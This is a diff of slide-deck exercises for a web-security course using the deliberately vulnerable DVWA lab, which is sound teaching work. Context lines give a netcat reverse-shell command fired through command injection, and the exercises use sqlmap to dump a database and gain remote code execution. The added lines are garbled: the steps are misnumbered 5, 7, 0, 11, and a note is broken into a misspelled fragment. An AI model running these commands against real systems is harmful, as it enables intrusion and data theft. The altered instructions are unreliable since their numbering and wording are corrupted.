@@ -791,6 +791,7 @@ comment out the rest of the line:
 4. Start a local netcat listener in a terminal and use the command injection to launch a reverse shell from the webserver
 	- Netcat listener: `nc -l -v -p 4444`
 	- Reverse shell: `nc -e /bin/bash 127.0.0.1 4444`
+5. Change DVWA security level from "medium" to "high" and attempt to exploit the vulnerability again
 ---
 class: middle, center
 # Command injection mitigation
@@ -1015,12 +1016,13 @@ FROM
 1. start Damn Vulnerable Web App (DVWA) - check readme.txt
 2. Exploit the SQLi
 3. Use `sqlmap` to exploit the SQLi (run `sqlmap -hh` for help)
-4. Proxy `sqlmap` through burp so that you can see what's going on. Look at `sqlmap`'s traffic. (`--proxy=http://127.0.0.1:8080`)
-4. Dump entire database using `sqlmap` (without proxying through burp)
-5. Get remote code execution using `sqlmap` (without proxying through burp)
-6. Get remote code execution again using `sqlmap`, this time while proxying through burp. How does `sqlmap` get code execution?
+5. Proxy `sqlmap` through burp so that you can see what's going on. Look at `sqlmap`'s traffic. (`--proxy=http://127.0.0.1:8080`)
+7. Dump entire database using `sqlmap` (without proxying through burp)
+0. Get remote code execution using `sqlmap` (without proxying through burp)
+11. Get remote code execution again using `sqlmap`, this time while proxying through burp. How does `sqlmap` get code execution?
 
-note: If `sqlmap` starts acting weird, run `sqlmap --purge-output` and make sure that your session is still valid
+note: `sqlmap` caches previous responses locally. Run `sqlmap --purge-output`.
+If things get wrid, and make sure that your session is still valid
 
 ---
 class: middle, center
